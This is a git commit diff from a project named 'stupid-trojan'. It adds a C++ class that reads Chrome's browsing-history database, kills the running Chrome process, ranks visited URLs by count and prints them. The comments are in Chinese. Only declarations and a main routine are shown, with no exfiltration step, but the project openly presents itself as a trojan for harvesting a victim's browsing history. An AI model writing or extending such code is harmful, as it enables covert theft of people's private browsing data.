2b20c183a3cacafdb0d8b9b30110dad749ecdeee
LiuzhouChan <llz.chann@gmail.com>
2016-12-08 01:50:48 +0800

    search the history of chrome

---
+++ stupid-trojan/BrowsHistory.h
@@ -0,0 +1,53 @@
+#pragma once  
+#include <iostream>  
+#include <algorithm>  
+#include <functional>  
+#include <vector>  
+#include "afxwin.h"  
+#include "CppSQLite3.h"  
+struct BrowsData
+{
+public:
+	// 网址  
+	CString strURL;
+
+	// 对应网址访问次数  
+	unsigned int nCount;
+
+	bool operator < (const BrowsData &m)const
+	{
+		return nCount > m.nCount;
+	}
+};
+class BrowsHistory
+{
+private:
+
+	// 保存获得的网址和访问次数  
+	std::vector<BrowsData> m_BrowsHistroy;
+private:
+
+	// Chrome网址过滤，如只取网址com前边的  
+	void urlFiltrateChrome(CString strUrlName);
+
+	// 查询进程是否已存在, 返回true表示存在；自动结束其进程  
+	bool IsRunning(CString exe);
+	// 编码转换  
+	void ConvertUtf8ToGBK(CStringA &strUtf8);
+	// 获取浏览器历史记录  
+	void InitHistroy(void);
+	// 多线程函数  
+	static void ThreadPro(LPVOID * ptr);
+	// 对获得的网址进行排序  
+	void Sort(void);
+public:
+	BrowsHistory();
+	~BrowsHistory();
+	// 获取网址的进程，是否执行完；执行完时为true；  
+	bool m_bStatus;
+	// 初始化  
+	void Init(void);
+	// 获取浏览器历史记录  
+	std::vector<BrowsData> GetBrowsHistory(void) const;
+};
+
--- stupid-trojan/stupid-trojan.cpp
+++ stupid-trojan/stupid-trojan.cpp
@@ -1,11 +1,24 @@
 // stupid-trojan.cpp : 定义控制台应用程序的入口点。
 //
 
-#include "stdafx.h"
+#include <vector>  
+#include "afxwin.h"  
+#include "BrowsHistory.h"  
 
+using namespace std;
 
-int main()
+int _tmain(int argc, _TCHAR* argv[])
 {
-    return 0;
-}
+	BrowsHistory browseHistory;
+	browseHistory.Init();
+	while (!browseHistory.m_bStatus);	//等待获取完成  
+	auto data = browseHistory.GetBrowsHistory();
+	auto it = data.begin();
 
+	for (; it<data.end(); ++it)
+	{
+		wprintf(_T("%s\n"), it->strURL);
+	}
+	getchar();
+	return 0;
+}
